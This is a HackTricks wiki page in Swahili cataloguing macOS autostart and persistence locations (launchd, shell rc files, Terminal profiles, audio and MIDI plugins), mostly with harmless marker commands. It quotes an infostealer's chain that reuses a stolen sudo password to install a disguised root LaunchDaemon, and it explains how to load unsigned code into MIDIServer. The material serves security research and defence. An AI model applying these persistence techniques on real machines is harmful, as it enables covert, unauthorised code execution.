# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Sehemu hii imejengwa kwa kiasi kikubwa juu ya mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Lengo lake ni kubaini maeneo ambako kuandika faili kunaweza kusababisha utekelezaji wa code baadaye, tukio linalochochea utekelezaji huo, na ruhusa zinazohitajika. Kuwepo kwa eneo fulani hakuthibitishi kuwa utaratibu huo umewashwa. Ukaguzi wa ndani ulioelezwa hapa chini ulifanywa kwenye macOS 26.5.2 (5 October 2026); hauonyeshi tabia ya kila toleo la macOS.

> [!NOTE]
> “Kuanzishwa kwa kuandika” haimaanishi kila wakati “huendeshwa mara tu baada ya kuandika.” Baadhi ya maeneo husomwa tu wakati wa kuingia kwenye akaunti, programu mahususi inapoanza, au mtumiaji anapotekeleza kitendo fulani. Payload inayoweza kuandikwa ndani ya job ambayo tayari imesanidiwa pia ni tofauti na ruhusa ya kusajili job mpya. Jaribu kwenye akaunti au VM ya majaribio kabla ya kutegemea mbinu fulani.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuwezesha kutekeleza kitu kwa **kukikiandika tu kwenye faili** na **kusubiri** kitendo **cha kawaida sana**, **muda maalum** upite, au **kitendo unachoweza kwa kawaida kutekeleza** ukiwa ndani ya sandbox bila kuhitaji ruhusa za root.

### Launchd

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

- **`/Library/LaunchAgents`**
  - **Kichocheo**: Kuingia kwa mtumiaji (au usajili wa moja kwa moja)
  - Inahitaji root
- **`/Library/LaunchDaemons`**
  - **Kichocheo**: Kuwashwa kwa mfumo (au usajili wa moja kwa moja)
  - Inahitaji root
- **`/System/Library/LaunchAgents`**
  - **Kichocheo**: Kuingia kwa mtumiaji; eneo la mfumo la Apple lililolindwa
- **`/System/Library/LaunchDaemons`**
  - **Kichocheo**: Kuwashwa kwa mfumo; eneo la mfumo la Apple lililolindwa
- **`~/Library/LaunchAgents`**
  - **Kichocheo**: Kuingia tena

Hakuna eneo la `~/Library/LaunchDaemons` linalochanganuliwa na `launchd`. Jobs za kila mtumiaji huwekwa kwenye `~/Library/LaunchAgents`; saraka ya system daemon ni `/Library/LaunchDaemons`. [Mwongozo wa Apple kuhusu uanzishaji wa launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) unaeleza maeneo yanayochanganuliwa.

> [!TIP]
> Jambo la kuvutia ni kwamba **`launchd`** ina property list iliyopachikwa katika sehemu ya Mach-o `__Text.__config`, ambayo ina huduma nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, huduma hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, ikimaanisha kwamba lazima ziendeshwe na zimalize kwa mafanikio.
>
> Bila shaka, haiwezi kurekebishwa kwa sababu ya code signing.

#### Maelezo na Unyonyaji

**`launchd`** ndiyo **process** ya **kwanza** kutekelezwa na kernel ya OX S wakati wa kuwasha mfumo, na ndiyo ya mwisho kumaliza wakati wa kuzima. Inapaswa kuwa na **PID 1** kila wakati. Process hii **husoma na kutekeleza** usanidi uliobainishwa kwenye **ASEP** **plists** katika:

- `/Library/LaunchAgents`: Agents za kila mtumiaji zilizowekwa na msimamizi
- `/Library/LaunchDaemons`: Daemons za mfumo mzima zilizowekwa na msimamizi
- `/System/Library/LaunchAgents`: Agents za kila mtumiaji zilizotolewa na Apple.
- `/System/Library/LaunchDaemons`: Daemons za mfumo mzima zilizotolewa na Apple.

Mtumiaji anapoingia, `launchd` hupakia plists zilizo kwenye `~/Library/LaunchAgents` ya mtumiaji huyo kwa ruhusa za mtumiaji huyo. Jobs huanzishwa kulingana na keys zake; kupakia plist pekee hakumaanishi kuwa process itatekelezwa mara moja.

**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa mtumiaji anapoingia na daemons hupakiwa wakati wa kuwasha mfumo** (kwa kuwa kuna huduma kama ssh zinazohitaji kutekelezwa kabla mtumiaji yeyote hajafikia mfumo). Pia, agents zinaweza kutumia GUI ilhali daemons zinahitaji kuendeshwa chinichini.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Kila kipengele cha `ProgramArguments` ni argument tofauti; `launchd` haichanganui string moja kama amri ya shell. Mfano uliosahihishwa hapo juu unaweza kukaguliwa kisintaksia bila kuupakia kwa kutumia `plutil -lint /path/to/example.plist`. Tazama ingizo la ndani la `man launchd.plist` kuhusu `ProgramArguments`, `RunAtLoad`, na `KeepAlive`.

#### Vichochezi vya matukio ya faili katika kazi zilizopo

Agent au daemon **ambayo tayari imepakiwa** inaweza kutumia `WatchPaths` kuanza njia iliyotajwa inapobadilika. `QueueDirectories` huanzisha kazi wakati saraka si tupu; `StartOnMount` huanzisha kazi volume inapowekwa (mount). [Mwongozo wa Apple wa launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) una mifano ya `WatchPaths` na `QueueDirectories`. Kuandika kwenye faili inayofuatiliwa huanzisha **kazi ambayo tayari imesanidiwa**; husababisha utekelezaji wa msimbo kiholela tu ikiwa mwandishi anaweza pia kudhibiti executable, script, au data inayotafsiriwa na kazi hiyo. Kuandika tu plist mpya nje ya eneo linalochanganuliwa au kusajiliwa hakuipakii.

PoC hii inayojisafisha husajili **user agent ya muda** yenye jina la kipekee, hubadilisha faili yake yenyewe tu inayofuatiliwa, kisha huondoa agent hiyo. Iliendeshwa kwa mafanikio kwenye macOS 26.5.2 bila kutoka kwenye akaunti au kuwasha upya:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Utekelezaji wa ndani ulionyesha `watch fired: True`, na `bootout` ilifaulu. `launchctl bootstrap` inatumika hapa tu ndani ya PoC iliyotengwa; **haihitajiki kwa job ambayo tayari imepakiwa**. Ili kutathmini job iliyopo kwa usalama, soma plist yake na njia ya `ProgramArguments` iliyotatuliwa, kisha angalia ikiwa executable husika au faili linalotafsiriwa linaweza kuandikwa bila kulibadilisha.

Kuna hali ambapo **Agent inahitaji kutekelezwa kabla mtumiaji hajaingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii husaidia kutoa teknolojia saidizi wakati wa kuingia. Pia zinaweza kupatikana katika `/Library/LaunchAgents` (tazama [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).

> [!TIP]
> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya kuwasha upya mfumo mara inayofuata au kwa kutumia** `launchctl load <target.plist>`. Pia **inawezekana kupakia faili za .plist bila kiendelezi hicho** kwa kutumia `launchctl -F <file>` (hata hivyo, faili hizo za plist hazitapakiwa kiotomatiki baada ya kuwasha upya mfumo).\
> Pia inawezekana **kuzipakua** kwa kutumia `launchctl unload <target.plist>` (mchakato unaoonyeshwa na faili hiyo utasitishwa),
>
> Ili **kuhakikisha** kwamba hakuna **kitu chochote** (kama vile override) **kinachozuia** **Agent** au **Daemon** **kuendesha**, tekeleza: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Orodhesha Agents na Daemons zote zilizopakiwa na mtumiaji wa sasa:

```bash
launchctl list
```

#### Mlolongo wa mfano wa LaunchDaemon hasidi (kutumia tena nenosiri)

Infostealer ya hivi majuzi ya macOS ilitumia tena **nenosiri la sudo lililonaswa** ili kusakinisha user agent na LaunchDaemon ya root:<sup>[[1]](#references)</sup>

- Andika mzunguko wa agent kwenye `~/.agent` na uufanye uweze kutekelezwa.
- Tengeneza plist katika `/tmp/starter` inayoelekeza kwenye agent hiyo.
- Tumia tena nenosiri lililoibwa kupitia `sudo -S` ili kuinakili hadi `/Library/LaunchDaemons/com.finder.helper.plist`, kuweka `root:wheel`, na kuipakia kwa `launchctl load`.
- Anzisha agent kimyakimya kupitia `nohup ~/.agent >/dev/null 2>&1 &` ili kutenganisha matokeo.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plist ya daemon iliyowekwa katika `/Library/LaunchDaemons` haifanywi salama kwa kuipa umiliki wa mtumiaji. `launchd` huhitaji umiliki na ruhusa zinazofaa kwa kazi za mfumo na inaweza kukataa plist isiyo salama. Daemon inayomilikiwa na root kwa kawaida huendeshwa kama root isipokuwa usanidi wake uchague akaunti nyingine. Kagua `UserName`, `GroupName`, umiliki na uchunguzi wa `launchctl` wa kazi hiyo; usihitimishe utambulisho wa mtumiaji anayeendesha kazi kwa kutegemea jina la mmiliki wa plist pekee.

#### Maelezo zaidi kuhusu launchd

**`launchd`** ni mchakato wa kwanza wa hali ya mtumiaji unaoanzishwa kutoka kwa **kernel**. Mchakato lazima uanze **kwa mafanikio** na **hauwezi kutoka au kuharibika**. Pia **umelindwa** dhidi ya baadhi ya **ishara za kuumaliza**.

Mojawapo ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemons** zote kama vile:

- **Timer daemons** zinazotegemea muda wa kutekelezwa:
  - `com.apple.atrun.plist` huendesha `/usr/libexec/atrun` ikiwa na `StartInterval = 30` sekunde katika macOS 26.5.2; hali yake halisi ya kuwezeshwa inaweza kutofautiana na ufunguo wa `Disabled` katika plist kwa sababu launchd huhifadhi mipangilio ya uboreshaji kando.
  - `com.vix.cron.plist` huendesha `/usr/sbin/cron` wakati `/usr/lib/cron/tabs` ina kazi. `com.apple.systemstats.daily` ni huduma tofauti iliyoratibiwa, si cron daemon.
- **Network daemons** kama vile:
  - `org.cups.cups-lpd`: Husikiliza kwenye TCP (`SockType: stream`) kwa `SockServiceName: printer`
    - SockServiceName lazima iwe nambari ya port au huduma kutoka `/etc/services`
  - `com.apple.xscertd.plist`: Husikiliza kwenye TCP kwenye port 1640
- **Path daemons** zinazoendeshwa wakati njia maalum inabadilika:
  - `com.apple.postfix.master`: Hukagua njia `/etc/postfix/aliases`
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: Inaonyesha jina `com.apple.xscertd.helper` katika ingizo la `MachServices`
- **UserEventAgent:**
  - Hii ni tofauti na iliyotangulia. Husababisha launchd kuanzisha apps kulingana na tukio maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Hupakia plugins kutoka kwenye folda iliyozuiwa na SIP `/System/Library/UserEventPlugins/`, ambapo kila plugin hubainisha kianzilishi chake kwenye ufunguo `XPCEventModuleInitializer` au, kwa plugins za zamani, kwenye dict ya `CFPluginFactories` chini ya ufunguo `FB86416D-6164-2070-726F-70735C216EC0` wa `Info.plist`.

### faili za uanzishaji wa shell

Maelezo: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Inafaa kwa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kupata app yenye TCC bypass inayoendesha shell inayopakia faili hizi

#### Maeneo

- **`~/.zshenv`** (au faili mpya zaidi iliyokusanywa **`~/.zshenv.zwc`**)
  - **Kichocheo**: Uendeshaji wowote wa kawaida wa zsh, ikiwemo `zsh -c` isiyoingiliana; `zsh -f` huruka faili za uanzishaji za mtumiaji.
- **`~/.zshrc`**
  - **Kichocheo**: zsh inayoingiliana inapoanza.
- **`~/.zprofile`, `~/.zlogin`**
  - **Kichocheo**: zsh ya kuingia inapoanza; husomwa kabla na baada ya `.zshrc`, mtawalia.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Kichocheo**: Fungua terminal yenye zsh
  - Haki za root zinahitajika
- **`~/.zlogout`**
  - **Kichocheo**: zsh ya kuingia inapotoka kawaida, si kila terminal au shell inapotoka.
- **`/etc/zlogout`**
  - **Kichocheo**: Toka kwenye terminal yenye zsh
  - Haki za root zinahitajika
- Huenda kuna zaidi katika: **`man zsh`**
- **`~/.bashrc`**
  - **Kichocheo**: Anzisha Bash inayoingiliana **isiyo ya kuingia**. Bash ya kuingia inayoingiliana huisoma tu ikiwa faili ya kuingia inaiingiza waziwazi.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Kichocheo**: Anzisha Bash ya kuingia; faili ya kwanza inayoweza kusomwa katika mpangilio huo huendeshwa. `~/.profile` hurukwa ikiwa mojawapo ya faili mbili za awali ipo.
- **`/etc/profile`**
  - **Kichocheo**: Anzisha Bash ya kuingia; kuibadilisha kunahitaji root.
- **`~/.tcshrc`** au, ikiwa haipo, **`~/.cshrc`**
  - **Kichocheo**: Anzisha `tcsh`, ikiwemo `tcsh -c` isiyoingiliana kwenye Mac hii. Mtumiaji lazima aendeshe `tcsh` kwa hakika; si shell chaguomsingi ya macOS.
- **`~/.login`**
  - **Kichocheo**: Anzisha `tcsh` ya kuingia baada ya faili yake ya rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Kichocheo**: Zinatarajiwa kuchochewa na xterm, lakini **haijasakinishwa** na hata baada ya kusakinishwa hitilafu hii hutokea: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Maelezo na Utekelezaji

Unapoanzisha mazingira ya shell kama `zsh` au `bash`, **baadhi ya faili za uanzishaji huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell chaguomsingi. Ikiwa Terminal au SSH itaanzisha shell ya kuingia au inayoingiliana hutegemea usanidi wake; usidhani kwamba kila faili iliyo hapo juu huendeshwa katika kila kipindi. Ingawa `bash` na `sh` pia zipo kwenye macOS, lazima ziitwe waziwazi ili zitumike.<sup>[[2]](#references)</sup> [Marejeo ya faili za uanzishaji wa zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) yanaeleza mpangilio, uboreshaji wa `ZDOTDIR` na kanuni ya `.zwc`.

Jaribio lifuatalo la kusoma pekee lilitumia `ZDOTDIR` ya muda kwenye macOS 26.5.2. Linaonyesha faili zipi za mtumiaji zilisomwa; hakuna faili halisi ya uanzishaji wa shell iliyobadilishwa:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Mpangilio ulioonekana ulikuwa `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` lazima iwe tayari inaelekeza kwenye directory mbadala; kuandika tu faili kwenye directory yoyote hakutoshi.

[Rejeo la uanzishaji la Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) linaweka tofauti kati ya login shell na interactive shell. Kwenye mashine ya majaribio ya macOS 26.5.2, `HOME` iliyotengwa na yenye faili zote nne za uanzishaji wa mtumiaji ilitoa matokeo haya: `bash -c` → hakuna; `bash -ic` → `.bashrc`; `bash -lc` na `bash -lic` → `.bash_profile` pekee. Kuondoa `.bash_profile` kulifanya login Bash isome `.bash_login`, kisha `.profile` nayo ilipoondolewa. `BASH_ENV` inaweza kuelekeza Bash isiyo ya interactive kwenye faili, lakini variable hiyo ya mazingira lazima iwe tayari imewekwa kwenye mchakato unaoianzisha. `exit` iliyo wazi kutoka kwa login Bash inaweza pia kupakia `~/.bash_logout`.

Mwongozo wa ndani wa `tcsh(1)` unaeleza mpangilio wake tofauti wa uanzishaji. Kwa kutumia `HOME` ya majaribio, `/bin/tcsh -c :` ilisoma `.tcshrc`, au `.cshrc` ikiwa `.tcshrc` haikuwepo. Login `tcsh` ya majaribio ilisoma `.tcshrc` na `.login`. Majaribio haya yaliunda na kuondoa faili za muda pekee.

### Programu Zinazofunguliwa Tena

> [!CAUTION]
> Kusanidi exploitation iliyoonyeshwa na kutoka kisha kuingia tena, au hata kuwasha upya, hakukuendesha app wakati wa majaribio. Huenda app inahitaji kuwa inaendeshwa wakati hatua hizi zinapotekelezwa.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Inafaa kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Kichochezi**: Kuwasha upya na kufungua tena programu

#### Maelezo na Exploitation

Programu zote zitakazofunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Kwa hiyo, ili kufanya programu zitakazofunguliwa tena zianzishe yako, unahitaji tu **kuongeza app yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha directory hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia programu zitakazofunguliwa tena, unaweza kufanya:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Mapendeleo ya Terminal

Maelezo: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Hufaa kwa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal ilikuwa na ruhusa za FDA za mtumiaji aliyeitumia

#### Mahali

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Kichochezi**: Fungua dirisha au kichupo kipya cha Terminal ukitumia profile ambayo mipangilio yake ya Shell ina amri ya kuanzisha

#### Maelezo na Unyonyaji

Katika **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji katika Applications. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza applications/scripts nyingine**.<sup>[[5]](#references)</sup>

Kwa mfano, Terminal inaweza kutekeleza amri wakati wa kuanzisha:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu unaonekana kwenye faili ya **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Ikiwa profile husika ina command ya kuanzisha na Terminal inasoma preference hiyo, session mpya inayotumia profile hiyo inaweza kuitekeleza. [Mwongozo wa sasa wa Terminal wa Apple](https://support.apple.com/guide/terminal/trmlshll/mac) unaeleza command ya kila profile iliyo chini ya **Shell → Startup**. Kufungua Terminal tu bila kuanzisha session mpya inayotumia profile hiyo hakutoshi. Mabadiliko ya preference yaliyo hapa chini **hayakutekelezwa** kwenye Mac ya utafiti.

Unaweza kuongeza hili kupitia cli kwa kutumia:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Viendelezi vingine vya faili

- Muhimu kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal inaweza kutumia ruhusa za FDA za mtumiaji anayeitumia

#### Mahali

- **Popote**
  - **Kichochezi**: Fungua faili husika ya `.terminal`, `.command`, au `.tool`

#### Maelezo na Unyonyaji

Mtumiaji akifungua faili ya mipangilio ya **`.terminal`**, Terminal inaweza kuunda kipindi kutoka kwa wasifu wake; faili za **`.command`** na **`.tool`** zinazoweza kutekelezwa pia zinaweza kufunguka kwenye Terminal. Hiki ni kichochezi cha wazi cha kufungua faili, si utekelezaji unaotokana na kufungua Terminal tu. Ufikiaji wowote wa TCC uliorithiwa hutegemea ruhusa halisi alizopewa Terminal na operesheni inayojaribiwa. Mfano wa kihistoria ulio hapa chini haukuendeshwa kwenye Mac ya utafiti.

Jaribu kwa kutumia:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Unaweza pia kutumia viendelezi **`.command`**, **`.tool`**, vyenye maudhui ya kawaida ya shell scripts, na navyo pia vitafunguliwa na Terminal.

> [!CAUTION]
> Ikiwa terminal ina **Full Disk Access**, itaweza kukamilisha kitendo hicho (kumbuka kuwa amri iliyotekelezwa itaonekana kwenye dirisha la terminal).

### Programu-jalizi za Sauti

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Husaidia bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root inahitajika
  - **Kichochezi**: Seva ya Core Audio hupakia programu-jalizi ya kifaa cha HAL inayooana; kuwasha upya seva kunaweza kusababisha utambuzi upya
- **`/Library/Audio/Plug-ins/Components`**
  - Root inahitajika
  - **Kichochezi**: Mfumo wa kupangisha sauti hugundua na kuanzisha Audio Unit iliyosakinishwa
- **`~/Library/Audio/Plug-ins/Components`**
  - **Kichochezi**: Mfumo wa kupangisha sauti hugundua na kuanzisha Audio Unit iliyosakinishwa
- **`/System/Library/Components`**
  - Mahali panayotolewa na Apple na kulindwa na mfumo
  - **Kichochezi**: Mfumo wa kupangisha sauti huanzisha system component inayolingana

#### Maelezo

Kulingana na writeup zilizotangulia, inawezekana **kukompaili baadhi ya audio plugins** na kuzifanya zipakiwe.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plugins na Audio Units hutumia njia tofauti za kupakiwa. [Mwongozo wa Apple wa kupangisha Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) unasema kuwa host lazima itafute na kuanzisha component; kuinakili kwenye saraka inayochanganuliwa au kuwasha upya `coreaudiod` pekee hakuthibitishi kuwa itatekelezwa. AUv2 plugins huendeshwa ndani ya mchakato wa host, ilhali [mwongozo wa sasa wa Apple kuhusu Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) unasema kuwa AUv3 kwa chaguomsingi huendeshwa katika mchakato tofauti kwenye macOS. Vizuizi vya signature, sandbox na library validation hutegemea host. Hakuna audio plugin iliyosakinishwa au kutekelezwa kwenye Mac iliyotumika kwa utafiti.

### Viendeshi vya CoreMIDI (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Husaidia bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Msimbo wako huendeshwa ndani ya mchakato wa `MIDIServer`, si ndani ya sandbox ya app yako
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` huendeshwa chini ya wasifu wake wa `seatbelt` sandbox

#### Mahali

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root haihitajiki (mtumiaji anaweza kuandika)
  - **Kichochezi**: `MIDIServer` huanza (upya). Huanzishwa inapohitajika mara ya kwanza mchakato wowote unapotumia CoreMIDI (kufungua *Audio MIDI Setup*, GarageBand, DAW, au ukurasa unaotumia WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root inahitajika
  - **Kichochezi**: sawa na hapo juu

#### Maelezo na Exploitation

`MIDIServer` ya Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) hupakia MIDI **driver** bundles kutoka kwenye saraka za `Audio/MIDI Drivers`. Binary imesainiwa na Apple, lakini inakuja na entitlement ya `com.apple.security.cs.disable-library-validation`, kwa hiyo itapakia bundle **isiyosainiwa au iliyosainiwa ad-hoc na team tofauti**, na hivyo kuruhusu utekelezaji wa msimbo ndani ya mchakato tofauti unaomilikiwa na Apple **bila root**.<sup>[[53]](#references)</sup>

Imethibitishwa kwenye macOS 26 (kusoma pekee):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Driver ni bundle ya kawaida inayotoa factory ya `MIDIDriverInterface`; kuweka payload ndani ya factory/constructor huiendesha mara tu `MIDIServer` inapoorodhesha drivers. Iunde, iweke kama `~/Library/Audio/MIDI Drivers/Evil.plugin`, kisha anzisha upakiaji bila logout/reboot:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
